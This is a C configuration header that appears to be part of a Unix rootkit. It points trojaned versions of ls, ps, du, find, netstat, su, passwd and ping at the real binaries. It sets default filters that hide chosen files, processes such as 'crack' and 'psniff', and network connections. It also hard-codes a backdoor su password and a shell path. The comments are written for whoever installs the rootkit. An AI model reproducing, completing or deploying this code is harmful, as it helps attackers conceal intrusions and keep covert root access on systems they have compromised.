/* 	Change this to where you would like to store your config file
	MUST BE WORLD READABLE!!!  /tmp is not a good place
*/

char *conf_file="/tmp/conf.inv";

/* 	
	Default's
	Default location and default filter's, these are used if the urk.conf
	cannot be found!!!
*/

#define ls_loc_def "/usr/bin/ls"
#define du_loc_def "/usr/bin/du"
#define ps_loc_def "/usr/bin/ps"
#define su_loc_def "/usr/bin/su"
#define find_loc_def "/usr/bin/find"
#define net_loc_def "/usr/bin/netstat"
#define passwd_loc_def "/usr/bin/passwd"
#define ping_loc_def "/usr/sbin/ping"
#define shell_loc_def "/usr/local/bin/bash"

#define file_fil_def "xxxxx,yyyyy"
#define ps_fil_def "crack,xxxxxx.ps,psniff,ps.gnu"
#define net_fil_def "666,van,a1a89441"

#define su_default "h4x0r"

/*=============================================================================
	You should not have to modify any of these 
 =============================================================================*/

#define MAXLEN	1024

char *file_section="[file]";
char *ls_location="ls";
char *find_location="find";
char *du_location="du";
char *file_filters="file_filters";

char *ps_section="[ps]";
char *ps_location="ps";
char *ps_filters="ps_filters";

char *netstat_section="[netstat]";
char *netstat_location="netstat";
char *netstat_filters="net_filters";

char *login_section="[login]";
char *login_pass="su_pass";
char *su_location="su_loc";
char *ping_location="ping";
char *passwd_location="passwd";
char *exec_shell="shell";

char *f_ptr[256];

char *file(char *,char *,char *);
int count_filter(char *);
FILE *popen_r(char* name_to_use, char** argv, pid_t* return_pid);
